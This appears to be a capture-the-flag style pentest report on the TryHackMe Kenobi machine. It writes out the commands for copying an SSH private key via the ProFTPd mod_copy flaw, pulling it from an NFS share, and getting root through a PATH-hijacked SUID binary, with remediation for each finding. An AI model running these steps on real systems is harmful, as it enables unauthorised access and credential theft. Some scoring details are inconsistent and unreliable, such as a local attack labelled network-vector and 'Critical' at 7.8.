# Penetration Testing & Vulnerability Assessment Report: Kenobi

**Target System:** Kenobi  
**Platform:** TryHackMe  
**OS:** Linux (Ubuntu)  
**Difficulty:** Easy / Medium  
**Assessment Type:** Network & Host Vulnerability Assessment  
**Prepared By:** Security Operations  

---

## Executive Summary

A comprehensive network and infrastructure penetration test was conducted against the **Kenobi** target host on TryHackMe. The objective of this assessment was to evaluate the target's attack surface, identify exposed services and software vulnerabilities, and determine the potential business impact of host compromise.

The assessment identified critical security deficiencies across multiple service layers. An unauthenticated attacker on the local network can exploit an unauthenticated file-copy vulnerability in ProFTPd (**CVE-2015-3306**) to exfiltrate sensitive SSH private keys via exposed Network File System (NFS) shares. Subsequently, local privilege escalation was achieved via **PATH Environment Variable Hijacking** targeting an insecure custom SUID binary (`/usr/bin/menu`), resulting in full root-level compromise (`uid=0`).

---

## Vulnerability Summary Table

| Finding ID | Vulnerability Title | Severity | CVSS v3.1 Score | Primary Impact |
| :--- | :--- | :--- | :--- | :--- |
| **KEN-01** | Unauthenticated Arbitrary File Copy in ProFTPd 1.3.5 (CVE-2015-3306) | **High** | **7.5** | Arbitrary File Read / Data Exfiltration |
| **KEN-02** | Sensitive File Access via Overly Permissive NFS Mount Export | **High** | **7.5** | Credential Leakage / Unauthorized System Access |
| **KEN-03** | Local Privilege Escalation via Custom SUID Binary PATH Hijacking | **Critical** | **7.8** | Complete System Compromise (`root`) |

---

## Detailed Vulnerability Findings & Technical Proof of Concept

### Finding KEN-01: Unauthenticated Arbitrary File Copy in ProFTPd 1.3.5 (CVE-2015-3306)

* **Severity:** High  
* **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (**7.5**)  
* **Vulnerable Service:** ProFTPd v1.3.5 (`mod_copy` module) running on TCP Port 21  

#### Description
The ProFTPd service version running on the target system uses an unpatched version of the `mod_copy` module. This module exposes `SITE CPFR` (Copy From) and `SITE CPTO` (Copy To) commands to unauthenticated users. An attacker can leverage this flaw to copy arbitrary files on the local filesystem to accessible directories without authenticating to the FTP service.

#### Technical Proof of Concept
1. Initial port enumeration using `nmap` identified ProFTPd 1.3.5 listening on TCP Port 21:
   ```bash
   nmap -Pn -sV -sC -oN initial_scan.txt <TARGET_IP>


2. Connected to the FTP service via `netcat` and issued `SITE CPFR` and `SITE CPTO` commands to copy user `kenobi`'s private SSH key to the world-readable `/var/tmp` directory:
```text
$ nc <TARGET_IP> 21
220 ProFTPD 1.3.5 Server
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

```



#### Remediation & Mitigation

* **Upgrade ProFTPd:** Update ProFTPd to a patched version ($\ge 1.3.5\text{a}$) where `mod_copy` enforces proper access controls.
* **Disable Unnecessary Modules:** If file copying via FTP is not required, disable `mod_copy` in `/etc/proftpd/modules.conf`.

---

### Finding KEN-02: Sensitive File Access via Overly Permissive NFS Mount Export

* **Severity:** High
* **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (**7.5**)
* **Vulnerable Service:** Network File System (NFS) listening on TCP Port 2049

#### Description

The NFS service exposes the system's `/var` directory to external network clients without IP restriction policies or authentication checks. An attacker can mount this remote directory locally and access files written to `/var/tmp` (such as the exfiltrated SSH key from **KEN-01**), enabling initial shell access as user `kenobi`.

#### Technical Proof of Concept

1. Enumerated exposed NFS mounts using `showmount`:
```bash
showmount -e <TARGET_IP>
# Output: Export list for <TARGET_IP>:

```


2. Mounted the remote `/var` directory to a local mount point:
```bash
sudo mkdir /mnt/kenobiNFS
sudo mount <TARGET_IP>:/var /mnt/kenobiNFS

```


3. Extracted the exfiltrated `id_rsa` key, set restrictive permissions (`chmod 600`), and authenticated via SSH:
```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@<TARGET_IP>

```


4. Successfully obtained initial shell access and extracted the user flag (`/home/kenobi/user.txt`).

#### Remediation & Mitigation

* **Restrict NFS Export Lists:** Configure `/etc/exports` to explicitly restrict directory mounts to trusted, specific IP addresses instead of the global wildcard (`*`).
* **Principle of Least Privilege:** Avoid exporting sensitive system directories such as `/var` or `/etc` over unencrypted network protocols.

---

### Finding KEN-03: Local Privilege Escalation via Custom SUID Binary PATH Hijacking

* **Severity:** Critical
* **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (**7.8**)
* **Vulnerable Binary:** Custom SUID binary `/usr/bin/menu`

#### Description

The system contains a custom compiled binary located at `/usr/bin/menu` with the SUID permission bit set (`-rwsr-xr-x`, owned by `root`). Inspection of the binary using `strings` revealed that it calls system utilities (e.g., `curl -I localhost`) using a **relative path** rather than an absolute path (`/usr/bin/curl`).

Because the binary executes with effective `root` privileges, an authenticated local attacker can manipulate their session `$PATH` variable to execute a malicious file named `curl`, resulting in arbitrary command execution as `root`.

#### Technical Proof of Concept

1. Discovered local SUID binaries using `find`:
```bash
find / -perm -u=s -type f 2>/dev/null

```


2. Inspected system call references inside `/usr/bin/menu` using `strings`:
```bash
strings /usr/bin/menu
# Identified relative execution: "curl -I localhost"

```


3. Created a malicious `curl` executable inside `/tmp` designed to spawn a shell:
```bash
cd /tmp
echo "/bin/sh" > curl
chmod +x curl

```


4. Prepended `/tmp` to the user's environment `$PATH` variable:
```bash
export PATH=/tmp:$PATH

```


5. Executed `/usr/bin/menu`, selected **Option 1** (`status check`), and successfully acquired a root shell:
```text
kenobi@kenobi:/tmp$ /usr/bin/menu
***************************************
1. status check
2. kernel version
3. ifconfig
***************************************
** Enter your choice : 1

# id
uid=0(root) gid=0(root) groups=0(root),1000(kenobi)
# cat /root/root.txt

```



#### Remediation & Mitigation

* **Use Absolute Paths:** Always use fully qualified absolute paths (e.g., `/usr/bin/curl`) when invoking external binaries within C programs or shell scripts.
* **Remove Unnecessary SUID Permissions:** Remove the SUID bit from non-essential custom binaries:
```bash
sudo chmod u-s /usr/bin/menu

```



---

## Strategic Recommendations

1. **Implement Centralized Patch Management:** Establish automated routines to scan and update exposed edge services (such as ProFTPd) to prevent known public CVE exploitation.
2. **Conduct Hardening Audits on SUID/SGID Binaries:** Periodically run local audit tools (such as LinPEAS or Lynis) in CI/CD and production environments to identify custom binaries invoking relative paths or unsafe system calls.
3. **Enforce Network Segmentation & Access Control:** Ensure file-sharing mechanisms (NFS, SMB) adhere to strict network isolation policies and require strong authentication before exposing local storage directories.

